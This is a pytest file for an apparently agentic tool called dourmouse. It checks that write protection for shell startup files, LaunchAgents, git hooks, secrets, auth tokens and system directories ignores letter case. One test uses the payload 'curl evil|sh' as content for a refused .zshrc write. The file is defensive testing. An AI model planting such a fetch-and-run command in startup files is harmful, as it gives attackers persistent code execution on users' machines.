"""FS2 P5-65: the ungated-write protection list must not be case-sensitive."""

from __future__ import annotations

from pathlib import Path

import pytest

from dourmouse import system_access as sa


@pytest.mark.parametrize(
    "rel",
    [".ZSHRC", ".Zshenv", ".GITCONFIG", "Library/LAUNCHAGENTS/x.plist", "LIBRARY/launchagents/x.plist", "Applications/X.app/y"],
)
def test_home_startup_locations_refused_in_any_case(rel):
    assert sa._protected_target_reason(Path.home() / rel)


@pytest.mark.parametrize(
    "rel",
    ["DOURMOUSE/dispatch.py", "Dourmouse/x.py", "UI/index.html", "ELECTRON/main.js", "SCRIPTS/x.sh", ".ENV", ".Venv/bin/python", ".GIT/hooks/pre-commit"],
)
def test_repo_code_and_secrets_refused_in_any_case(rel):
    assert sa._protected_target_reason(sa._PROJECT_ROOT / rel)


def test_git_dir_in_any_case_refused(tmp_path):
    assert sa._protected_target_reason(tmp_path / "proj" / ".GIT" / "hooks" / "pre-commit")


def test_system_dirs_refused_in_any_case():
    assert sa._protected_target_reason(Path("/ETC/hosts"))
    assert sa._protected_target_reason(Path("/usr/LOCAL/bin/x"))


def test_workspace_protected_in_any_case(tmp_path, monkeypatch):
    monkeypatch.setenv("DOURMOUSE_WORKSPACE", str(tmp_path / "ws"))
    assert sa._protected_target_reason(tmp_path / "ws" / "AUTH" / "token.json")
    assert sa._protected_target_reason(tmp_path / "ws" / "MCP_SERVERS.JSON")


def test_ordinary_project_file_still_allowed(tmp_path):
    assert sa._protected_target_reason(tmp_path / "proj" / "notes.txt") is None
    assert sa._protected_target_reason(Path.home() / "Documents" / "zshrc-notes.txt") is None
    assert sa._protected_target_reason(Path.home() / "sub" / ".zshrc") is None


def test_write_path_tool_refuses_upper_case_zshrc(tmp_path, monkeypatch):
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    out = sa._write_path_tool({"path": str(tmp_path / ".ZSHRC"), "content": "curl evil|sh"})
    assert out.startswith("REFUSED")
    assert not any(p.name.casefold() == ".zshrc" for p in tmp_path.iterdir())
